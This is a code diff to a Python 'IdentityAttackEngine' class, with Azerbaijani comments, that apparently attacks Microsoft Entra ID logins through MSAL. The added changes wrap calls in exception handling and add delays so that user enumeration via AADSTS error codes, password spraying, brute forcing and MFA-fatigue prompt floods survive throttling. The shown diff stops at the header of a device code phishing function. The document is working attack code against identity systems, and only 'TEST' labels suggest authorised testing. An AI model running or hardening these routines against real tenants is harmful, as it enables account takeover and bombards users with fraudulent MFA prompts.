@@ -244,18 +244,27 @@ class IdentityAttackEngine:
     def run_user_enumeration(self, max_targets=20):
         print(f"\n[*] --- USER ENUMERATION TESTİ (İlk {max_targets} Hədəf) ---")
         for user in self.users[:max_targets]:
-            result = self.public_app.acquire_token_by_username_password(
-                username=user,
-                password="DummyPassword123!",
-                scopes=["https://graph.microsoft.com/.default"]
-            )
-            err_desc = result.get("error_description", "")
-            if any(c in err_desc for c in ["AADSTS50126", "AADSTS50055", "AADSTS50053", "AADSTS7000218"]):
-                print(f"[+] MÖVCUDDUR (Valid User): {user}")
-            elif "AADSTS50034" in err_desc:
-                print(f"[-] MÖVCUD DEYİL (Invalid User): {user}")
-            else:
-                print(f"[?] CAVAB ({user}): {err_desc[:50]}")
+            # BUG FIX: MSAL bəzi hallarda (throttling/429, realm discovery xətası)
+            # OAuth error dict qaytarmır — birbaşa exception atır. try/except
+            # olmadan tək bir throttled sorğu bütün prosesi çökərtə bilər.
+            try:
+                result = self.public_app.acquire_token_by_username_password(
+                    username=user,
+                    password="DummyPassword123!",
+                    scopes=["https://graph.microsoft.com/.default"]
+                )
+                err_desc = result.get("error_description", "")
+                if any(c in err_desc for c in ["AADSTS50126", "AADSTS50055", "AADSTS50053", "AADSTS7000218"]):
+                    print(f"[+] MÖVCUDDUR (Valid User): {user}")
+                elif "AADSTS50034" in err_desc:
+                    print(f"[-] MÖVCUD DEYİL (Invalid User): {user}")
+                else:
+                    print(f"[?] CAVAB ({user}): {err_desc[:50]}")
+            except Exception as e:
+                print(f"[-] UĞURSUZ (exception): {user} -> {str(e)[:80]}")
+                time.sleep(1.5)
+                continue
+            time.sleep(0.3)
 
     def run_password_spray(self, spray_password="Autumn2026!Argus", max_targets=20):
         print(f"\n[*] --- KÜTLƏVİ PASSWORD SPRAY TESTİ ('{spray_password}') ---")
@@ -263,32 +272,50 @@ class IdentityAttackEngine:
         success_count = 0
         fail_count = 0
         for user in targets:
-            result = self.public_app.acquire_token_by_username_password(
-                username=user, password=spray_password,
-                scopes=["https://graph.microsoft.com/.default"]
-            )
+            # BUG FIX: eyni MSAL exception riski (throttling/429) — spray xüsusilə
+            # çox sayda ardıcıl sorğu göndərdiyi üçün ən çox bu riskə məruz qalır.
+            try:
+                result = self.public_app.acquire_token_by_username_password(
+                    username=user, password=spray_password,
+                    scopes=["https://graph.microsoft.com/.default"]
+                )
+            except Exception as e:
+                print(f"[-] UĞURSUZ (exception): {user} -> {str(e)[:80]}")
+                fail_count += 1
+                time.sleep(1.5)
+                continue
+
             if "access_token" in result:
                 print(f"[+] UĞURLU: {user}")
                 success_count += 1
             else:
-                err = result.get("error_description", "").splitlines()[0]
+                err_desc = result.get("error_description", "")
+                err = err_desc.splitlines()[0] if err_desc else result.get("error", "naməlum xəta")
                 print(f"[-] UĞURSUZ: {user} -> ({err[:55]}...)")
                 fail_count += 1
+            time.sleep(0.4)
         print(f"\n[=] XÜLASƏ: {success_count} Uğurlu | {fail_count} Uğursuz")
 
     def run_brute_force(self, target_user, target_password):
         print(f"\n[*] --- BRUTE FORCE TESTİ ({target_user}) ---")
         test_passwords = self.passwords[:6] + [target_password]
         for password in test_passwords:
-            result = self.public_app.acquire_token_by_username_password(
-                username=target_user, password=password,
-                scopes=["https://graph.microsoft.com/.default"]
-            )
+            try:
+                result = self.public_app.acquire_token_by_username_password(
+                    username=target_user, password=password,
+                    scopes=["https://graph.microsoft.com/.default"]
+                )
+            except Exception as e:
+                print(f"[-] UĞURSUZ (exception): {password} -> {str(e)[:60]}")
+                time.sleep(1.5)
+                continue
+
             if "access_token" in result:
                 print(f"[+] UĞURLU: Doğru şifrə tapıldı -> '{password}'")
                 return result["access_token"]
             else:
-                err = result.get("error_description", "").splitlines()[0]
+                err_desc = result.get("error_description", "")
+                err = err_desc.splitlines()[0] if err_desc else result.get("error", "naməlum xəta")
                 print(f"[-] UĞURSUZ: {password} -> ({err[:45]}...)")
             time.sleep(1)
         return None
@@ -297,16 +324,19 @@ class IdentityAttackEngine:
         print(f"\n[*] --- MFA FATIGUE SIMULYASİYASI ({target_user}) ---")
         for i in range(1, count + 1):
             print(f"[*] Cəhd #{i}...")
-            result = self.public_app.acquire_token_by_username_password(
-                username=target_user, password=valid_password,
-                scopes=["https://graph.microsoft.com/.default"]
-            )
-            err_desc = result.get("error_description", "")
-            if "access_token" in result:
-                print("    [+] UĞURLU: Daxil olundu.")
-            else:
-                first_line = err_desc.splitlines()[0] if err_desc else "Xəta"
-                print(f"    [-] Cavab: {first_line[:60]}...")
+            try:
+                result = self.public_app.acquire_token_by_username_password(
+                    username=target_user, password=valid_password,
+                    scopes=["https://graph.microsoft.com/.default"]
+                )
+                err_desc = result.get("error_description", "")
+                if "access_token" in result:
+                    print("    [+] UĞURLU: Daxil olundu.")
+                else:
+                    first_line = err_desc.splitlines()[0] if err_desc else "Xəta"
+                    print(f"    [-] Cavab: {first_line[:60]}...")
+            except Exception as e:
+                print(f"    [-] UĞURSUZ (exception): {str(e)[:60]}")
             time.sleep(2)
 
     def run_device_code_phishing_init(self):
